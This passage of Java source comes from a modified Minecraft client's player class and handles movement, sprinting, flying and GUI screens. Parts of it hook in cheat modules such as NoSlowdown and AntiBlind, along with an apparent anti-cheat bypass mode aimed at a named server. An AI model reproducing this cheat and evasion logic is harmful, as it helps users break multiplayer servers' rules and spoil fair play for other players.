
				if (func_175162_d(var7.offsetSouth()) && 1.0D - var10 < var13) {
					var13 = 1.0D - var10;
					var12 = 5;
				}

				final float var15 = 0.1F;

				if (var12 == 0) {
					motionX = -var15;
				}

				if (var12 == 1) {
					motionX = var15;
				}

				if (var12 == 4) {
					motionZ = -var15;
				}

				if (var12 == 5) {
					motionZ = var15;
				}
			}

			return false;
		}
	}

	private boolean func_175162_d(final BlockPos p_175162_1_) {
		return !worldObj.getBlockState(p_175162_1_).getBlock().isNormalCube()
				&& !worldObj.getBlockState(p_175162_1_.offsetUp()).getBlock().isNormalCube();
	}

	/**
	 * Set sprinting switch for Entity.
	 */
	@Override
	public void setSprinting(final boolean sprinting) {
		super.setSprinting(sprinting);
		sprintingTicksLeft = sprinting ? 600 : 0;
	}

	/**
	 * Sets the current XP, total XP, and level number.
	 */
	public void setXPStats(final float p_71152_1_, final int p_71152_2_, final int p_71152_3_) {
		experience = p_71152_1_;
		experienceTotal = p_71152_2_;
		experienceLevel = p_71152_3_;
	}

	/**
	 * Notifies this sender of some sort of information. This is for messages
	 * intended to display to the user. Used for typical output (like "you asked for
	 * whether or not this game rule is set, so here's your answer" ), warnings
	 * (like "I fetched this block for you by ID, but I'd like you to know that
	 * every time you do this, I die a little inside "), and errors (like "it's not
	 * called iron_pixacke, silly").
	 */
	@Override
	public void addChatMessage(final IChatComponent message) {
		mc.ingameGUI.getChatGUI().printChatMessage(message);
	}

	/**
	 * Returns true if the command sender is allowed to use the given command.
	 */
	@Override
	public boolean canCommandSenderUseCommand(final int permissionLevel, final String command) {
		return permissionLevel <= 0;
	}

	@Override
	public BlockPos getPosition() {
		return new BlockPos(posX + 0.5D, posY + 0.5D, posZ + 0.5D);
	}

	@Override
	public void playSound(final String name, final float volume, final float pitch) {
		worldObj.playSound(posX, posY, posZ, name, volume, pitch, false);
	}

	/**
	 * Returns whether the entity is in a server world
	 */
	@Override
	public boolean isServerWorld() {
		return true;
	}

	public boolean isRidingHorse() {
		return ridingEntity != null && ridingEntity instanceof EntityHorse
				&& ((EntityHorse) ridingEntity).isHorseSaddled();
	}

	public float getHorseJumpPower() {
		return horseJumpPower;
	}

	@Override
	public void func_175141_a(final TileEntitySign p_175141_1_) {
		mc.displayGuiScreen(new GuiEditSign(p_175141_1_));
	}

	@Override
	public void displayCommandBlockGUI(final CommandBlockLogic cmdBlockLogic) {
		mc.displayGuiScreen(new GuiCommandBlock(cmdBlockLogic));
	}

	/**
	 * Displays the GUI for interacting with a book.
	 */
	@Override
	public void displayGUIBook(final ItemStack bookStack) {
		final Item var2 = bookStack.getItem();

		if (var2 == Items.writable_book) {
			mc.displayGuiScreen(new GuiScreenBook(this, bookStack, true));
		}
	}

	/**
	 * Displays the GUI for interacting with a chest inventory. Args: chestInventory
	 */
	@Override
	public void displayGUIChest(final IInventory chestInventory) {
		final String var2 = chestInventory instanceof IInteractionObject
				? ((IInteractionObject) chestInventory).getGuiID()
				: "minecraft:container";

		if ("minecraft:chest".equals(var2)) {
			mc.displayGuiScreen(new GuiChest(inventory, chestInventory));
		} else if ("minecraft:hopper".equals(var2)) {
			mc.displayGuiScreen(new GuiHopper(inventory, chestInventory));
		} else if ("minecraft:furnace".equals(var2)) {
			mc.displayGuiScreen(new GuiFurnace(inventory, chestInventory));
		} else if ("minecraft:brewing_stand".equals(var2)) {
			mc.displayGuiScreen(new GuiBrewingStand(inventory, chestInventory));
		} else if ("minecraft:beacon".equals(var2)) {
			mc.displayGuiScreen(new GuiBeacon(inventory, chestInventory));
		} else if (!"minecraft:dispenser".equals(var2) && !"minecraft:dropper".equals(var2)) {
			mc.displayGuiScreen(new GuiChest(inventory, chestInventory));
		} else {
			mc.displayGuiScreen(new GuiDispenser(inventory, chestInventory));
		}
	}

	@Override
	public void displayGUIHorse(final EntityHorse p_110298_1_, final IInventory p_110298_2_) {
		mc.displayGuiScreen(new GuiScreenHorseInventory(inventory, p_110298_2_, p_110298_1_));
	}

	@Override
	public void displayGui(final IInteractionObject guiOwner) {
		final String var2 = guiOwner.getGuiID();

		if (null != var2) {
			switch (var2) {
			case "minecraft:crafting_table":
				mc.displayGuiScreen(new GuiCrafting(inventory, worldObj));
				break;
			case "minecraft:enchanting_table":
				mc.displayGuiScreen(new GuiEnchantment(inventory, worldObj, guiOwner));
				break;
			case "minecraft:anvil":
				mc.displayGuiScreen(new GuiRepair(inventory, worldObj));
				break;
			default:
				break;
			}
		}
	}

	@Override
	public void displayVillagerTradeGui(final IMerchant villager) {
		mc.displayGuiScreen(new GuiMerchant(inventory, villager, worldObj));
	}

	/**
	 * Called when the player performs a critical hit on the Entity. Args: entity
	 * that was hit critically
	 */
	@Override
	public void onCriticalHit(final Entity p_71009_1_) {
		Minecraft.effectRenderer.spawnParticle(p_71009_1_, EnumParticleTypes.CRIT);
	}

	@Override
	public void onEnchantmentCritical(final Entity p_71047_1_) {
		Minecraft.effectRenderer.spawnParticle(p_71047_1_, EnumParticleTypes.CRIT_MAGIC);
	}

	/**
	 * Returns if this entity is sneaking.
	 */
	@Override
	public boolean isSneaking() {
		final boolean var1 = movementInput != null ? movementInput.sneak : false;
		return var1 && !sleeping;
	}

	@Override
	public void updateEntityActionState() {
		super.updateEntityActionState();

		if (func_175160_A()) {
			moveStrafing = movementInput.moveStrafe;
			moveForward = movementInput.moveForward;
			isJumping = movementInput.jump;
			prevRenderArmYaw = renderArmYaw;
			prevRenderArmPitch = renderArmPitch;
			renderArmPitch = (float) (renderArmPitch + (rotationPitch - renderArmPitch) * 0.5D);
			renderArmYaw = (float) (renderArmYaw + (rotationYaw - renderArmYaw) * 0.5D);
		}
	}

	public double distanceToGround() {
		if (onGround) {
			return 0;
		}
		return posY - groundY;
	}

	public int lowestBlock() {

		for (int i = 0; i < 255; i++) {
			if (Minecraft.theWorld
					.canBlockSeeSky(new BlockPos(Minecraft.thePlayer.posX, i, Minecraft.thePlayer.posZ))) {
				return i;
			}
		}

		return -1;
	}

	protected boolean func_175160_A() {
		return mc.func_175606_aa() == this;
	}

	/**
	 * Called frequently so the entity can update its state every tick as required.
	 * For example, zombies and skeletons use this to react to sunlight and start to
	 * burn.
	 */
	@Override
	public void onLivingUpdate() {

		if (Configs.noBob) {
			Minecraft.thePlayer.distanceWalkedModified = 0.0F;
		}

		realPosY = boundingBox.minY;

		if (Minecraft.currentScreen != null && Minecraft.currentScreen instanceof ClickGUI) {
			final KeyBinding[] moveKeys = new KeyBinding[] { Minecraft.gameSettings.keyBindForward,
					Minecraft.gameSettings.keyBindBack, Minecraft.gameSettings.keyBindLeft,
					Minecraft.gameSettings.keyBindRight, Minecraft.gameSettings.keyBindJump,
					Minecraft.gameSettings.keyBindSprint, Minecraft.gameSettings.keyBindSneak };
			final KeyBinding[] arrkeyBinding = moveKeys;
			final int n = arrkeyBinding.length;
			int n2 = 0;
			while (n2 < n && arrkeyBinding[n2] != null) {
				try {
					final KeyBinding bind = arrkeyBinding[n2];
					bind.pressed = Keyboard.isKeyDown(bind.getKeyCode());
				} catch (final Exception e) {
					e.printStackTrace();
				}
				++n2;
			}
		}

		if (ILikeParticles.mod.isToggled()) {
			for (int var1 = 0; var1 < 5; ++var1) {
				worldObj.spawnParticle(EnumParticleTypes.PORTAL, posX + (rand.nextDouble() - 0.5D) * width, posY - 0.5,
						posZ + (rand.nextDouble() - 0.5D) * width, (rand.nextDouble() - 0.5D) / 2.0D, 0,
						(rand.nextDouble() - 0.5D) / 2.0D, new int[0]);
			}
			if (!onGround & !isInWater() & !isInWeb) {
				for (int var1 = 0; var1 < 3; ++var1) {
					worldObj.spawnParticle(EnumParticleTypes.CLOUD, posX + (rand.nextDouble() - 0.5D) * width, posY,
							posZ + (rand.nextDouble() - 0.5D) * width, (rand.nextDouble() - 0.5D) / 2.0D, -0.5,
							(rand.nextDouble() - 0.5D) / 2.0D, new int[0]);
				}
			}
		}
		if (onGround) {
			groundY = posY;
		}

		Client.onUpdate();

		final EventUpdate event = new EventUpdate();
		EventManager.call(event);

		if (onGround) {
			groundY = posY;
		}
		if (sprintingTicksLeft > 0) {
			--sprintingTicksLeft;

			if (sprintingTicksLeft == 0) {
				setSprinting(false);
			}
		}

		if (sprintToggleTimer > 0) {
			--sprintToggleTimer;
		}

		prevTimeInPortal = timeInPortal;

		if (inPortal) {
			if (Minecraft.currentScreen != null && !Minecraft.currentScreen.doesGuiPauseGame()) {
				mc.displayGuiScreen((GuiScreen) null);
			}

			if (timeInPortal == 0.0F) {
				mc.getSoundHandler().playSound(PositionedSoundRecord.createPositionedSoundRecord(
						new ResourceLocation("portal.trigger"), rand.nextFloat() * 0.4F + 0.8F));
			}

			timeInPortal += 0.0125F;

			if (timeInPortal >= 1.0F) {
				timeInPortal = 1.0F;
			}

			inPortal = false;
		} else if (this.isPotionActive(Potion.confusion)
				&& getActivePotionEffect(Potion.confusion).getDuration() > 60) {
			timeInPortal += 0.006666667F;

			if (timeInPortal > 1.0F) {
				timeInPortal = 1.0F;
			}
		} else {
			if (timeInPortal > 0.0F) {
				timeInPortal -= 0.05F;
			}

			if (timeInPortal < 0.0F) {
				timeInPortal = 0.0F;
			}
		}

		if (timeUntilPortal > 0) {
			--timeUntilPortal;
		}

		final boolean var1 = movementInput.jump;
		final boolean var2 = movementInput.sneak;
		final float var3 = 0.8F;
		final boolean var4 = movementInput.moveForward >= var3;
		movementInput.updatePlayerMoveState();

		if (isUsingItem() && !isRiding()
				&& !(NoSlowdown.mod.isToggled() && !(YesCheat.enabled && YesCheat.mode == Mode.Gomme))) {
			movementInput.moveStrafe *= 0.2F;
			movementInput.moveForward *= 0.2F;
			sprintToggleTimer = 0;
		}

		pushOutOfBlocks(posX - width * 0.35D, getEntityBoundingBox().minY + 0.5D, posZ + width * 0.35D);
		pushOutOfBlocks(posX - width * 0.35D, getEntityBoundingBox().minY + 0.5D, posZ - width * 0.35D);
		pushOutOfBlocks(posX + width * 0.35D, getEntityBoundingBox().minY + 0.5D, posZ - width * 0.35D);
		pushOutOfBlocks(posX + width * 0.35D, getEntityBoundingBox().minY + 0.5D, posZ + width * 0.35D);
		final boolean var5 = getFoodStats().getFoodLevel() > 6.0F || capabilities.allowFlying;

		if (onGround && !var2 && !var4 && movementInput.moveForward >= var3 && !isSprinting() && var5
				&& !isUsingItem()) {
			if (sprintToggleTimer <= 0 && !Minecraft.gameSettings.keyBindSprint.getIsKeyPressed()) {
				sprintToggleTimer = 7;
			} else {
				if (!this.isPotionActive(Potion.blindness)) {
					setSprinting(true);
				} else if (AntiBlind.mod.isToggled()) {
					setSprinting(true);
				}
			}
		}

		if (!isSprinting() && movementInput.moveForward >= var3 && var5 && !isUsingItem()
				&& !this.isPotionActive(Potion.blindness) && Minecraft.gameSettings.keyBindSprint.getIsKeyPressed()) {
			setSprinting(true);
		}

		if (isSprinting() && (movementInput.moveForward < var3 || isCollidedHorizontally || !var5)) {
			setSprinting(false);
		}

		if (capabilities.allowFlying) {
			if (Minecraft.playerController.isSpectatorMode()) {
				if (!capabilities.isFlying) {
					capabilities.isFlying = true;
					sendPlayerAbilities();
				}
			} else if (!var1 && movementInput.jump) {
				if (flyToggleTimer == 0) {
					flyToggleTimer = 7;
				} else {
					capabilities.isFlying = !capabilities.isFlying;
					sendPlayerAbilities();
					flyToggleTimer = 0;
				}
			}
		}

		if (capabilities.isFlying && func_175160_A()) {
			if (movementInput.sneak) {
				motionY -= capabilities.getFlySpeed() * 3.0F;
			}

			if (movementInput.jump) {
				motionY += capabilities.getFlySpeed() * 3.0F;
			}
		}

		if (isRidingHorse()) {
			if (horseJumpPowerCounter < 0) {
				++horseJumpPowerCounter;

				if (horseJumpPowerCounter == 0) {
					horseJumpPower = 0.0F;
				}
			}

			if (var1 && !movementInput.jump) {
				horseJumpPowerCounter = -10;
				sendHorseJump();
			} else if (!var1 && movementInput.jump) {
				horseJumpPowerCounter = 0;
				horseJumpPower = 0.0F;
			} else if (var1) {
				++horseJumpPowerCounter;

				if (horseJumpPowerCounter < 10) {
					horseJumpPower = horseJumpPowerCounter * 0.1F;
				} else {
					horseJumpPower = 0.8F + 2.0F / (horseJumpPowerCounter - 9) * 0.1F;
				}
			}
		} else {
			horseJumpPower = 0.0F;
		}

		super.onLivingUpdate();

		if (onGround && capabilities.isFlying && !Minecraft.playerController.isSpectatorMode()) {
			capabilities.isFlying = false;
			sendPlayerAbilities();
		}
	}
}
